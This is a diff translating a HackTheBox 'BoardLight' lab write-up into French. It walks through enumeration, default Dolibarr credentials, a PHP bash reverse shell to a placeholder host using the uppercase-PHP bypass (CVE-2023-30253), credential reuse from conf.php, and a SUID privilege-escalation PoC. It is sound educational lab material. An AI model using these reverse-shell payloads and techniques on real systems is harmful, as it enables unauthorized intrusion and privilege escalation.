@@ -45,22 +45,22 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 90.05 seconds
 ```
 
-We discover two open ports: SSH (22) and HTTP (80) and we also add `board.htb` to the hosts file to facilitate the enumeration.
+Notre scan révèle deux ports ouverts: SSH (22) et HTTP (80), nous ajoutons également `board.htb` au fichier `hosts` pour faciliter l'énumération.
 
 ## Enumération
 
-At `http://board.htb/` we find a static website for a cybersecurity consulting firm. The buttons are not functional and nothing really stands out. 
+À `http://board.htb/`, nous trouvons un site web pour une société de conseil en cybersécurité. Les boutons ne fonctionnent pas et il n'y a rien de vraiment marquant. 
 
 ![BoardLight website](/images/HTB-BoardLight/boardlight_website.png)
 
-We try directory brute forcing but nothing intersing is found.
+Nous essayons de trouver des répertoires cachés mais rien d'intéressant n'est trouvé.
 
 ```
 gobuster dir -u http://board.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ```
 ![Directory bruteforcing](/images/HTB-BoardLight/gobuster_cmd.png)
 
-With subdomain enumeration we find a valid subdomain called `crm`.
+Avec l'énumération des sous-domaines, nous trouvons un sous-domaine valide appelé `crm`.
 
 ```
 ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://board.htb -H "Host: FUZZ.board.htb" -ic -fs 15949
@@ -68,31 +68,31 @@ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -
 
 ![Subdomain enumeration](/images/HTB-BoardLight/ffuf_cmd.png)
 
-At `http://crm.board.htb/` we find a login page for [Dolibarr](https://www.dolibarr.org/).
+Sur `http://crm.board.htb/` nous trouvons une page de connexion pour [Dolibarr](https://www.dolibarr.org/).
 
 ![Dolibarr ERP](/images/HTB-BoardLight/crm_board.png)
 
-With a quick Google search we discover that the default credentials for Dolibarr instance are `admin:admin` and using them grant us access.
+Une simple recherche Google nous permet de découvrir que les identifiants par défaut des instances Dolibarr sont `admin:admin` et en les utilisant nous accédons au tableau de bord.
 
 ![Dolibarr default credentials](/images/HTB-BoardLight/Dolibarr_default_creds.png)
 
 ![Dolibarr dashboard](/images/HTB-BoardLight/dolibarr_dashboard.png)
 
-If you have a little bit on HackTheBox you know by now that once you log into a CRM, you are usually able to gain RCE by executing some code.
+Bien que les systèmes CRM, CMS et ERP aient des objectifs différents, ils présentent souvent une vulnérabilité commune: une fois connecté, il est souvent possible d'obtenir un shell en exécutant un code malveillant.
 
-In the`Websites` section we create a new website.
+Dans la section `Websites`, nous créons un nouveau site web.
 
 ![Dolibarr new website](/images/HTB-BoardLight/new_website.png)
 
-Then let's create a page.
+Ensuite, créons une page.
 
 ![Dolibarr new page](/images/HTB-BoardLight/new_page.png)
 
-After the creation of the page there is a `Edit HTML Source` button we can use to add some custom code.
+Après la création de la page, il y a un bouton `Edit HTML Source` que nous pouvons utiliser pour ajouter notre code.
 
 ![Edit HTML source button](/images/HTB-BoardLight/edit_source.png)
 
-We try a basic php reverse shell.
+Nous essayons un reverse shell php basique.
 
 ```php
 <?php system('/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"') ?>
@@ -100,15 +100,15 @@ We try a basic php reverse shell.
 
 ![Dolibarr reverse shell](/images/HTB-BoardLight/rev_shell1.png)
 
-We then get an error, it seems that we cannot use `system`. From here we can either find another method to get a shell or try to bypass the security measure.
+Après avoir essayé de sauvegarder le code, nous obtenons une erreur, il semble que nous ne puissions pas utiliser `system`. A partir de là, nous pouvons soit trouver une autre méthode pour obtenir un shell, soit essayer de contourner la mesure de sécurité.
 
 ![Dolibarr php system error](/images/HTB-BoardLight/error_dolibarr.png)
 
 ## Accès Initial
 
-Searching exploits for Dolibarr, we find [this page](https://www.vicarius.io/vsociety/posts/exploiting-rce-in-dolibarr-cve-2023-30253-30254) for `CVE-2023-30253` allowing us to get remote code execution by using an uppercase manipulation.
+En recherchant les vulnérabilités de Dolibarr, nous trouvons [cette page](https://www.vicarius.io/vsociety/posts/exploiting-rce-in-dolibarr-cve-2023-30253-30254) pour le `CVE-2023-30253` qui nous permet d'obtenir une exécution de code à distance en utilisant une manipulation de majuscules.
 
-Let's try again with the php in uppercase letters (PHP).
+Réessayons avec le php en majuscules (PHP).
 
 ```php
 <?PHP system('/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"') ?>
@@ -116,43 +116,43 @@ Let's try again with the php in uppercase letters (PHP).
 
 ![Dolibarr RCE](/images/HTB-BoardLight/Dolibar_rce.png)
 
-After saving the modified code we get a shell as `www-data`.
+Après avoir sauvegardé le code modifié, nous obtenons un shell sous le nom de `www-data`.
 
 ![foothold shell](/images/HTB-BoardLight/foothold.png)
 
-Checking the `passwd` we notice a user called `larissa` and of course we cannot access her home directory.
+En consultant le fichier `passwd`, nous remarquons la présence d'un utilisateur appelé `larissa` et, bien sûr, nous ne pouvons pas accéder à son répertoire personnel.
 
 ![larissa user](/images/HTB-BoardLight/larissa_user.png)
 
-After using linpeas for the system enumeration we find a configuration directory at `/var/www/html/crm.board.htb/htdocs/conf/`.
+Grâce à linpeas, nous trouvons un répertoire de configuration à `/var/www/html/crm.board.htb/htdocs/conf/`.
 
 ![linpeas results](/images/HTB-BoardLight/linpeas_results.png)
 
 ![conf directory](/images/HTB-BoardLight/conf_directory.png)
 
-We then find some credentials in the `conf.php` file.
+En examinant le contenu de `conf.php`, nous obtenons des identifiants.
 
 ![dolibar conf credentials](/images/HTB-BoardLight/dolibarr_creds.png)
 
-With the password found we are able to access larissa's account via SSH and we find the user flag in her home directory.
+Avec le mot de passe trouvé, nous accédons au compte de larissa via SSH et nous trouvons le fichier `user.txt` dans son répertoire personnel.
 
 ![user flag](/images/HTB-BoardLight/user_flag.png)
 
 ## Elévation de Privilèges
 
-We discover than larissa is not allowed to run sudo.
+Malheureusement, larissa n'est pas autorisée à exécuter sudo.
 
 ![sudo command](/images/HTB-BoardLight/sudo_cmd.png)
 
-Let's run linpeas again to find some leads for privilege escalation. We find a file called `enlightenment` owned by root with the SUID bit set and a reference to [CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706).
+Exécutons à nouveau linpeas pour trouver des pistes d'escalade de privilèges. Nous trouvons un fichier appelé `enlightenment` appartenant à root avec le bit SUID activé et une référence au [CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706).
 
 ![SUID on enlightenment binary](/images/HTB-BoardLight/suid-file.png)
 
-[Here](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main) we find a PoC for the vulnerability. After running the script on the target we gain root privileges and the root flag is accessible at `/root/root.txt`.
+[Ici](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main) nous trouvons un PoC pour la vulnérabilité. Après avoir exécuté le script (exploit.sh) sur la cible, nous obtenons les privilèges root et `root.txt` est accessible dans `/root`.
 
 ![root flag](/images/HTB-BoardLight/root_flag.png)
 
-Thanks for reading this write up!
+Merci d'avoir pris le temps de lire cet article!
 
 
 
